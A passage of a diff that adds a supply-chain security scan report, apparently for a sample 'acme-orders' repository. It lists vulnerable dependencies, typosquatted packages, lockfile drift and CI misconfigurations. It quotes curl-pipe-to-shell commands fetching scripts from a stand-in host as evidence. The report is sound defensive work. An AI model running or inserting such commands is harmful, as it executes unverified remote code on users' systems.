+<li><a href="https://osv.dev/vulnerability/GHSA-q93h-jc49-78gg">GHSA-q93h-jc49-78gg</a> (CVE-2020-9547): CRITICAL, CVSS 9.8, fixed in 2.9.10.4. jackson-databind mishandles the interaction between serialization gadgets and typing</li>
+<li>… 48 more in findings.json</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-009 · 🟥 Critical (9.8) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)</li>
+<li><strong>Component:</strong> <code>minimist@0.0.8</code> (npm, scope prod, transitive), purl <code>pkg:npm/minimist@0.0.8</code></li>
+<li><strong>Where:</strong> <code>package-lock.json</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → mkdirp@0.5.1 → minimist@0.0.8</li>
+<li><strong>Official severity:</strong> CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 0.2.4</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-xvch-5gv4-984h">GHSA-xvch-5gv4-984h</a> (CVE-2021-44906): CRITICAL, CVSS 9.8, fixed in 0.2.4. Prototype Pollution in minimist</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-vh95-rmgr-6w4m">GHSA-vh95-rmgr-6w4m</a> (CVE-2020-7598): MEDIUM, CVSS 5.6, fixed in 0.2.1. Prototype Pollution in minimist</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-010 · 🟥 Critical (9.8) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8)</li>
+<li><strong>Component:</strong> <code>org.apache.commons:commons-text@1.9</code> (maven, scope prod, direct), purl <code>pkg:maven/org.apache.commons/commons-text@1.9</code></li>
+<li><strong>Where:</strong> <code>notifier/pom.xml</code></li>
+<li><strong>Dependency path:</strong> com.acme:notifier@1.0.0 → org.apache.commons:commons-text@1.9</li>
+<li><strong>Official severity:</strong> CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 1.10.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-599f-7c49-w659">GHSA-599f-7c49-w659</a> (CVE-2022-42889): CRITICAL, CVSS 9.8, fixed in 1.10.0. Arbitrary code execution in Apache Commons Text</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-011 · 🟥 Critical (9.8) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)</li>
+<li><strong>Component:</strong> <code>pyyaml@5.3.0</code> (pypi, scope prod, direct), purl <code>pkg:pypi/pyyaml@5.3.0</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:2</code></li>
+<li><strong>Dependency path:</strong> worker → pyyaml@5.3.0</li>
+<li><strong>Official severity:</strong> CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 5.4</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-6757-jp84-gxfx">GHSA-6757-jp84-gxfx</a> (CVE-2020-1747): CRITICAL, CVSS 9.8, fixed in 5.3.1. Improper Input Validation in PyYAML</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-8q59-q68h-6hv4">GHSA-8q59-q68h-6hv4</a> (CVE-2020-14343): CRITICAL, CVSS 9.8, fixed in 5.4. Improper Input Validation in PyYAML</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-012 · 🟥 Critical (9.0) · Typosquatted package · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> 'crossenv' looks like the popular package 'cross-env'</li>
+<li><strong>Component:</strong> <code>crossenv@7.0.3</code> (npm, scope dev, direct), purl <code>pkg:npm/crossenv@7.0.3</code></li>
+<li><strong>Where:</strong> <code>package.json:18</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → crossenv@7.0.3</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>package.json:18</code>: <code>&quot;crossenv&quot;: &quot;7.0.3&quot;</code></li>
+<li>popular_npm.txt: 'crossenv' is identical once separators and 'python-/node-' prefixes are removed from 'cross-env'</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R01_TYPOSQUAT default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A name that imitates a popular package is a common way to get malicious code installed by mistake.</li>
+<li><strong>Basis:</strong> heuristic, confidence high</li>
+</ul>
+<h3>F-013 · 🟥 Critical (9.0) · Typosquatted package · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> 'python3-dateutil' looks like the popular package 'python-dateutil'</li>
+<li><strong>Component:</strong> <code>python3-dateutil@2.8.1</code> (pypi, scope prod, direct), purl <code>pkg:pypi/python3-dateutil@2.8.1</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:4</code></li>
+<li><strong>Dependency path:</strong> worker → python3-dateutil@2.8.1</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>worker/requirements.txt:4</code>: <code>python3-dateutil==2.8.1</code></li>
+<li>popular_pypi.txt: 'python3-dateutil' is identical once separators and 'python-/node-' prefixes are removed from 'python-dateutil'</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R01_TYPOSQUAT default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A name that imitates a popular package is a common way to get malicious code installed by mistake.</li>
+<li><strong>Basis:</strong> heuristic, confidence high</li>
+</ul>
+<h3>F-014 · 🟥 Critical (9.0) · Unsafe install script · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> .github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell</li>
+<li><strong>Where:</strong> <code>.github/workflows/ci.yml:22</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>.github/workflows/ci.yml:22</code>: <code>- run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R12_REMOTE_SCRIPT_EXEC default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A script is downloaded and executed without any integrity check.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-015 · 🟥 Critical (9.0) · Unsafe CI/CD component · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> .github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinned to a commit SHA</li>
+<li><strong>Component:</strong> <code>fastbuilds42/cache-helper@main</code> (github-actions, scope ci, direct), purl <code>pkg:github/fastbuilds42/cache-helper@main</code></li>
+<li><strong>Where:</strong> <code>.github/workflows/ci.yml:20</code></li>
+<li><strong>Dependency path:</strong> ci → fastbuilds42/cache-helper@main</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>.github/workflows/ci.yml:20</code>: <code>- uses: fastbuilds42/cache-helper@main</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R15_CI_UNPINNED_ACTION default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A third-party action referenced by tag/branch can be changed by its owner at any time.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-016 · 🟥 Critical (9.0) · Unsafe CI/CD component · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> .github/workflows/ci.yml: workflow token has 'permissions: write-all'</li>
+<li><strong>Where:</strong> <code>.github/workflows/ci.yml:8</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>.github/workflows/ci.yml:8</code>: <code>permissions: write-all</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R16_CI_EXCESSIVE_PERMISSIONS default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The workflow token can write to the repository, so any compromised step can too.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-017 · 🟥 Critical (9.0) · Unsafe install script · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> Dockerfile downloads a script and pipes it into a shell</li>
+<li><strong>Where:</strong> <code>Dockerfile:4</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>Dockerfile:4</code>: <code>RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R12_REMOTE_SCRIPT_EXEC default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A script is downloaded and executed without any integrity check.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-018 · 🟥 Critical (9.0) · Suspicious package update · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e (&quot;chore: routine dependency refresh&quot;)</li>
+<li><strong>Where:</strong> <code>commit 8cad42e</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>commit <code>8cad42e</code> by fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a> (first-time contributor), 2026-11-23T13:19:53+05:30: &quot;chore: routine dependency refresh&quot;</li>
+<li>changed: M .github/workflows/ci.yml, M Dockerfile, M package-lock.json, M package.json, A scripts/setup.js, M worker/requirements.txt</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R18_NEW_AUTHOR_SENSITIVE_CHANGE default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A first-time contributor changed files that control what gets built and installed.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-019 · 🟥 Critical (9.0) · Untrusted image · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fastbuilds42/node)</li>
+<li><strong>Component:</strong> <code>fastbuilds42/node:latest</code> (docker, scope prod, direct), purl <code>pkg:docker/fastbuilds42/node@latest?repository_url=docker.io</code></li>
+<li><strong>Where:</strong> <code>Dockerfile:1</code></li>
+<li><strong>Dependency path:</strong> Dockerfile → fastbuilds42/node:latest</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>Dockerfile:1</code>: <code>FROM docker.io/fastbuilds42/node:latest</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R10_UNTRUSTED_BASE_IMAGE default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The image is not an official or verified-publisher image.</li>
+<li><strong>Basis:</strong> heuristic, confidence high</li>
+</ul>
+<h3>F-020 · 🟥 Critical (9.0) · Modified lockfile · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry</li>
+<li><strong>Component:</strong> <code>lodash@4.17.15</code> (npm, scope prod, direct), purl <code>pkg:npm/lodash@4.17.15</code></li>
+<li><strong>Where:</strong> <code>package-lock.json:50</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → lodash@4.17.15</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>package-lock.json:50</code>: <code>&quot;resolved&quot;: &quot;https://npm-mirror.example.invalid/lodash/-/lodash-4.17.15.tgz&quot;,</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R05_LOCKFILE_UNTRUSTED_SOURCE default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The package is downloaded from a host other than the official registry.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-021 · 🟥 Critical (9.0) · Modified lockfile · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks for '4.17.15'</li>
+<li><strong>Component:</strong> <code>lodash@4.17.15</code> (npm, scope prod, direct), purl <code>pkg:npm/lodash@4.17.15</code></li>
+<li><strong>Where:</strong> <code>package-lock.json:51</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → lodash@4.17.15</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>package.json: &quot;lodash&quot;: &quot;4.17.15&quot; in both bf0e651 and 8cad42e</li>
+<li>lockfile change in <code>package-lock.json</code>: resolved: <code>https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz</code> → <code>https://npm-mirror.example.invalid/lodash/-/lodash-4.17.15.tgz</code>; integrity: <code>sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmbKmRS6J3VQppPOIt0MnmE+4xlZoumy0GPG0D0MVIQbNA1A==</code> → <code>sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==</code></li>
+<li>commit <code>8cad42e</code> by fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a>, 2026-11-23T13:19:53+05:30: &quot;chore: routine dependency refresh&quot;</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (9.0): R07_LOCKFILE_DRIFT default level High; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The lockfile entry changed although the manifest did not ask for a change.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-022 · 🟧 High (8.8) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> node-fetch@2.6.0: 2 known vulnerabilities (highest HIGH, CVSS 8.8)</li>
+<li><strong>Component:</strong> <code>node-fetch@2.6.0</code> (npm, scope prod, direct), purl <code>pkg:npm/node-fetch@2.6.0</code></li>
+<li><strong>Where:</strong> <code>package-lock.json</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → node-fetch@2.6.0</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 8.8 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.6.7</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-r683-j2x4-v87g">GHSA-r683-j2x4-v87g</a> (CVE-2022-0235): HIGH, CVSS 8.8, fixed in 2.6.7. node-fetch forwards secure headers to untrusted sites</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-w7rc-rwvf-8q5r">GHSA-w7rc-rwvf-8q5r</a> (CVE-2020-15168): LOW, CVSS 2.6, fixed in 2.6.1. The <code>size</code> option isn't honored after following a redirect in node-fetch</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (8.8): highest advisory severity HIGH (CVSS 8.8)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-023 · 🟧 High (8.6) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6)</li>
+<li><strong>Component:</strong> <code>axios@0.21.0</code> (npm, scope prod, direct), purl <code>pkg:npm/axios@0.21.0</code></li>
+<li><strong>Where:</strong> <code>package-lock.json</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → axios@0.21.0</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 8.6 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 0.33.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-pjwm-pj3p-43mv">GHSA-pjwm-pj3p-43mv</a> (CVE-2026-44492): HIGH, CVSS 8.6, fixed in 0.32.0. axios's shouldBypassProxy does not recognize IPv4-mapped IPv6 addresses, allowing NO_PROXY bypass (incomplete fix for CVE-2025-62718)</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-jr5f-v2jv-69x6">GHSA-jr5f-v2jv-69x6</a> (CVE-2025-27152): HIGH, fixed in 0.30.0. axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-p92q-9vqr-4j8v">GHSA-p92q-9vqr-4j8v</a> (CVE-2026-44487): HIGH, fixed in 0.32.0. Axios: Proxy-Authorization Credential Leak to Origin Server Across HTTP-to-HTTPS Redirect in Axios Node.js HTTP Adapter</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-43fc-jf86-j433">GHSA-43fc-jf86-j433</a> (CVE-2026-25639): HIGH, CVSS 7.5, fixed in 0.30.3. Axios is Vulnerable to Denial of Service via <strong>proto</strong> Key in mergeConfig</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-62hf-57xw-28j9">GHSA-62hf-57xw-28j9</a> (CVE-2026-42039): HIGH, CVSS 7.5, fixed in 0.31.1. Axios: unbounded recursion in toFormData causes DoS via deeply nested request data</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-cph5-m8f7-6c5x">GHSA-cph5-m8f7-6c5x</a> (CVE-2021-3749): HIGH, CVSS 7.5, fixed in 0.21.2. axios Inefficient Regular Expression Complexity vulnerability</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-hfxv-24rg-xrqf">GHSA-hfxv-24rg-xrqf</a> (CVE-2026-44496): HIGH, CVSS 7.5, fixed in 0.32.0. Axios: Regular Expression Denial of Service (ReDoS) via Cookie Name Injection</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-j5f8-grm9-p9fc">GHSA-j5f8-grm9-p9fc</a> (CVE-2026-44486): HIGH, CVSS 7.5, fixed in 0.32.0. Axios: Proxy-Authorization header leaks to redirect target when proxy is re-evaluated to direct connection</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-6chq-wfr3-2hj9">GHSA-6chq-wfr3-2hj9</a> (CVE-2026-42035): HIGH, CVSS 7.4, fixed in 0.31.1. Axios: Header Injection via Prototype Pollution</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-pf86-5x62-jrwf">GHSA-pf86-5x62-jrwf</a> (CVE-2026-42033): HIGH, CVSS 7.4, fixed in 0.31.1. Axios: Prototype Pollution Gadgets - Response Tampering, Data Exfiltration, and Request Hijacking</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-pmwg-cvhr-8vh7">GHSA-pmwg-cvhr-8vh7</a> (CVE-2026-42043): HIGH, CVSS 7.2, fixed in 0.31.1. Axios: Incomplete Fix for CVE-2025-62718 — NO_PROXY Protection Bypassed via RFC 1122 Loopback Subnet (127.0.0.0/8) in Axios 1.15.0</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-3g43-6gmg-66jw">GHSA-3g43-6gmg-66jw</a> (CVE-2026-44495): HIGH, CVSS 7.0, fixed in 0.31.1. axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge</li>
+<li>… 13 more in findings.json</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (8.6): highest advisory severity HIGH (CVSS 8.6)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-024 · 🟧 High (8.6) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6)</li>
+<li><strong>Component:</strong> <code>jinja2@2.10.0</code> (pypi, scope prod, direct), purl <code>pkg:pypi/jinja2@2.10.0</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:3</code></li>
+<li><strong>Dependency path:</strong> worker → jinja2@2.10.0</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 8.6 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 3.1.6</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-462w-v97r-4m45">GHSA-462w-v97r-4m45</a> (CVE-2019-10906): HIGH, CVSS 8.6, fixed in 2.10.1. Jinja2 sandbox escape via string formatting</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-q2x7-8rv6-6q7h">GHSA-q2x7-8rv6-6q7h</a> (CVE-2024-56326): HIGH, CVSS 7.8, fixed in 3.1.5. Jinja has a sandbox breakout through indirect reference to format method</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-cpwx-vrp4-4pq7">GHSA-cpwx-vrp4-4pq7</a> (CVE-2025-27516): MEDIUM, fixed in 3.1.6. Jinja2 vulnerable to sandbox breakout through attr filter selecting format method</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-h5c8-rqwp-cp95">GHSA-h5c8-rqwp-cp95</a> (CVE-2024-22195): MEDIUM, CVSS 5.4, fixed in 3.1.3. Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-h75v-3vvj-5mfj">GHSA-h75v-3vvj-5mfj</a> (CVE-2024-34064): MEDIUM, CVSS 5.4, fixed in 3.1.4. Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-g3rq-g295-4j3m">GHSA-g3rq-g295-4j3m</a> (CVE-2020-28493): MEDIUM, CVSS 5.3, fixed in 2.11.3. Regular Expression Denial of Service (ReDoS) in Jinja2</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (8.6): highest advisory severity HIGH (CVSS 8.6)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-025 · 🟧 High (8.1) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1)</li>
+<li><strong>Component:</strong> <code>lodash@4.17.15</code> (npm, scope prod, direct), purl <code>pkg:npm/lodash@4.17.15</code></li>
+<li><strong>Where:</strong> <code>package-lock.json</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → lodash@4.17.15</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 8.1 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 4.18.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-r5fr-rjxr-66jc">GHSA-r5fr-rjxr-66jc</a> (CVE-2026-4800): HIGH, CVSS 8.1, fixed in 4.18.0. lodash vulnerable to Code Injection via <code>_.template</code> imports key names</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-p6mc-m468-83gw">GHSA-p6mc-m468-83gw</a> (CVE-2020-8203): HIGH, CVSS 7.4, fixed in 4.17.19. Prototype Pollution in lodash</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-35jh-r3h4-6jhm">GHSA-35jh-r3h4-6jhm</a> (CVE-2021-23337): HIGH, CVSS 7.2, fixed in 4.17.21. Command Injection in lodash</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-xxjr-mmjv-4gpg">GHSA-xxjr-mmjv-4gpg</a> (CVE-2025-13465): MEDIUM, CVSS 6.5, fixed in 4.17.23. Lodash has Prototype Pollution Vulnerability in <code>_.unset</code>, <code>_.omit</code>, and <code>_.pullAt</code> functions</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-29mw-wpgm-hmr9">GHSA-29mw-wpgm-hmr9</a> (CVE-2020-28500): MEDIUM, CVSS 5.3, fixed in 4.17.21. Regular Expression Denial of Service (ReDoS) in lodash</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (8.1): highest advisory severity HIGH (CVSS 8.1)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-026 · 🟧 High (8.0) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0)</li>
+<li><strong>Component:</strong> <code>follow-redirects@1.13.0</code> (npm, scope prod, transitive), purl <code>pkg:npm/follow-redirects@1.13.0</code></li>
+<li><strong>Where:</strong> <code>package-lock.json</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → axios@0.21.0 → follow-redirects@1.13.0</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 8.0 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 1.16.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-74fj-2j2h-c42q">GHSA-74fj-2j2h-c42q</a> (CVE-2022-0155): HIGH, CVSS 8.0, fixed in 1.14.7. Exposure of sensitive information in follow-redirects</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-cxjh-pqwp-8mfp">GHSA-cxjh-pqwp-8mfp</a> (CVE-2024-28849): MEDIUM, CVSS 6.5, fixed in 1.15.6. follow-redirects' Proxy-Authorization header kept across hosts</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-jchw-25xp-jwwc">GHSA-jchw-25xp-jwwc</a> (CVE-2023-26159): MEDIUM, CVSS 6.1, fixed in 1.15.4. Follow Redirects improperly handles URLs in the url.parse() function</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-pw2r-vq6v-hr8c">GHSA-pw2r-vq6v-hr8c</a> (CVE-2022-0536): MEDIUM, CVSS 5.9, fixed in 1.14.8. Exposure of Sensitive Information to an Unauthorized Actor in follow-redirects</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-r4q5-vmmm-2653">GHSA-r4q5-vmmm-2653</a> (CVE-2026-40895): MEDIUM, fixed in 1.16.0. follow-redirects leaks Custom Authentication Headers to Cross-Domain Redirect Targets</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (8.0): highest advisory severity HIGH (CVSS 8.0)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-027 · 🟧 High (7.5) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> com.fasterxml.jackson.core:jackson-core@2.9.8: 4 known vulnerabilities (highest HIGH, CVSS 7.5)</li>
+<li><strong>Component:</strong> <code>com.fasterxml.jackson.core:jackson-core@2.9.8</code> (maven, scope prod, transitive), purl <code>pkg:maven/com.fasterxml.jackson.core/jackson-core@2.9.8</code></li>
+<li><strong>Where:</strong> <code>notifier/pom.xml</code></li>
+<li><strong>Dependency path:</strong> com.acme:notifier@1.0.0 → com.fasterxml.jackson.core:jackson-databind@2.9.8 → com.fasterxml.jackson.core:jackson-core@2.9.8</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 7.5 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.18.11</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-h46c-h94j-95f3">GHSA-h46c-h94j-95f3</a> (CVE-2025-52999): HIGH, fixed in 2.15.0. jackson-core can throw a StackoverflowError when processing deeply nested data</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-r7wm-3cxj-wff9">GHSA-r7wm-3cxj-wff9</a> (CVE-2026-68494): HIGH, fixed in 2.18.8. jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-7hhh-6rmp-j9qf">GHSA-7hhh-6rmp-j9qf</a> (CVE-2026-89425): HIGH, CVSS 7.5, fixed in 2.18.11. jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -&gt; unbounded StringBuilder growth (DoS)</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-wf8f-6423-gfxg">GHSA-wf8f-6423-gfxg</a> (CVE-2025-49128): MEDIUM, CVSS 4.0, fixed in 2.13.0. Jackson-core Vulnerable to Memory Disclosure via Source Snippet in JsonLocation</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (7.5): highest advisory severity HIGH (CVSS 7.5)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-028 · 🟧 High (7.5) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> requests@2.19.1: 5 known vulnerabilities (highest HIGH, CVSS 7.5)</li>
+<li><strong>Component:</strong> <code>requests@2.19.1</code> (pypi, scope prod, direct), purl <code>pkg:pypi/requests@2.19.1</code></li>
